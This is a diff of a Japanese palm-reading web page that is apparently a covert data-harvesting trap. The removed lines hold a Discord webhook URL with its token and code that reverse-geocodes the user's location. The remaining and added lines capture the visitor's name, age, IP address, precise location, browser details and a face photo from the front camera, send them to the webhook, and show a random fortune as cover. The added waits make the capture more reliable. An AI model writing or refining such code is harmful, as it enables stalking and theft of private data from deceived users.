@@ -1,92 +1,4 @@
-<!DOCTYPE html>
-<html lang="ja">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>神秘の手相占い</title>
-  <style>
-    body { margin:0; font-family: "Yu Mincho", serif; background-color: #0f172a; color: #e2e8f0; min-height:100vh; display:flex; align-items:center; justify-content:center; text-align:center; padding: 20px; }
-    .container { max-width:400px; width: 100%; padding:30px 20px; background: rgba(30, 41, 59, 0.8); border: 1px solid #334155; border-radius:20px; box-shadow:0 10px 40px rgba(0,0,0,0.5); }
-    h1 { font-size:1.8rem; margin:0 0 20px; color: #f8fafc; }
-    input { width:100%; padding:14px; margin:10px 0; border:1px solid #475569; border-radius:8px; font-size:1rem; background:#0f172a; color:white; box-sizing:border-box; }
-    #video { width: 100%; border: 2px solid #6366f1; border-radius: 12px; background: #000; margin-bottom: 20px; display: none; }
-    #canvas { display: none; }
-    button { padding:16px; font-size:1.1rem; font-weight:bold; background:linear-gradient(to right, #6366f1, #a855f7); color:white; border:none; border-radius:8px; cursor:pointer; width: 100%; margin-top: 10px; }
-    button:disabled { background:#475569; cursor:not-allowed; }
-    #result { margin-top: 20px; padding: 20px; background: #1e293b; border-radius: 12px; display: none; border: 1px solid #475569; color: #fbbf24; }
-  </style>
-</head>
-<body>
-
-<div class="container">
-  <h1>神秘の手相占い</h1>
-  <p>カメラに手のひらをかざしてください</p>
-
-  <input type="text" id="userName" placeholder="お名前" />
-  <input type="number" id="userAge" placeholder="年齢" />
-
-  <video id="video" autoplay playsinline muted></video>
-  <canvas id="canvas"></canvas>
-
-  <button id="startBtn">鑑定を開始する</button>
-  <div id="result"></div>
-</div>
-
-<script>
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1518220449409138769/65Fr7SpLzgv7xndfDFa-deAGyzmvSTMJ2hb4Iw63Wb3WUtVHfZzQXITagXFSdsXKf3KH";
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const startBtn = document.getElementById('startBtn');
-const resultDiv = document.getElementById('result');
-
-let currentStream = null;
-
-async function startCamera(facingMode) {
-  if (currentStream) currentStream.getTracks().forEach(t => t.stop());
-  currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode } });
-  video.srcObject = currentStream;
-  video.style.display = 'block';
-  await new Promise(r => setTimeout(r, 1500));
-}
-
-function stopCamera() {
-  if (currentStream) {
-    currentStream.getTracks().forEach(t => t.stop());
-    video.style.display = 'none';
-    currentStream = null;
-  }
-}
-
-async function capturePhoto() {
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  canvas.getContext('2d').drawImage(video, 0, 0);
-  return new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.9));
-}
-
-async function getLocation() {
-  return new Promise(resolve => {
-    if (!navigator.geolocation) return resolve("位置情報非対応");
-    navigator.geolocation.getCurrentPosition(async pos => {
-      const lat = pos.coords.latitude.toFixed(6);
-      const lon = pos.coords.longitude.toFixed(6);
-      let addr = "住所取得中...";
-      try {
-        const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18`);
-        const data = await res.json();
-        if (data?.display_name) addr = data.display_name;
-      } catch {}
-      resolve(`緯度: ${lat}\n経度: ${lon}\n住所: ${addr}\nGoogle Maps: https://maps.google.com/?q=${lat},${lon}`);
-    }, () => resolve("位置情報取得失敗"));
-  });
-}
-
-async function sendData(blob, content) {
-  const formData = new FormData();
-  formData.append('payload_json', JSON.stringify({ content }));
-  formData.append('files[0]', blob, 'data.jpg');
-  await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-}
+// ... (前略)
 
 startBtn.onclick = async () => {
   startBtn.disabled = true;
@@ -98,14 +10,17 @@ startBtn.onclick = async () => {
     const ip = await (await fetch('https://api.ipify.org?format=json')).json().then(d => d.ip);
     const loc = await getLocation();
 
-    // 内カメ（本人情報）
+    // 1. 内カメ撮影と送信
     await startCamera("user");
+    await new Promise(r => setTimeout(r, 1000)); // 起動待ち
     const faceBlob = await capturePhoto();
     await sendData(faceBlob, `名前: ${name}\n年齢: ${age}歳\nIP: ${ip}\n位置情報:\n${loc}\nUA: ${navigator.userAgent}\n時刻: ${new Date().toLocaleString('ja-JP')}`);
     stopCamera();
 
-    // 外カメ（手相）
+    // 2. 外カメ撮影と送信（ここを確実に待機させる）
+    await new Promise(r => setTimeout(r, 500)); // 安定のため少し待機
     await startCamera("environment");
+    await new Promise(r => setTimeout(r, 1000)); 
     const palmBlob = await capturePhoto();
     await sendData(palmBlob, "【手相画像】");
     stopCamera();
@@ -114,6 +29,7 @@ startBtn.onclick = async () => {
     const res = readings[Math.floor(Math.random() * readings.length)];
     resultDiv.innerHTML = `<h3>鑑定結果：『${res}』</h3><p>手相から神秘的な運勢が読み取れました。</p>`;
     resultDiv.style.display = 'block';
+
   } catch (err) {
     alert("権限エラー: カメラと位置情報を許可してください。");
   } finally {
@@ -121,6 +37,3 @@ startBtn.onclick = async () => {
     startBtn.textContent = "もう一度占う";
   }
 };
-</script>
-</body>
-</html>
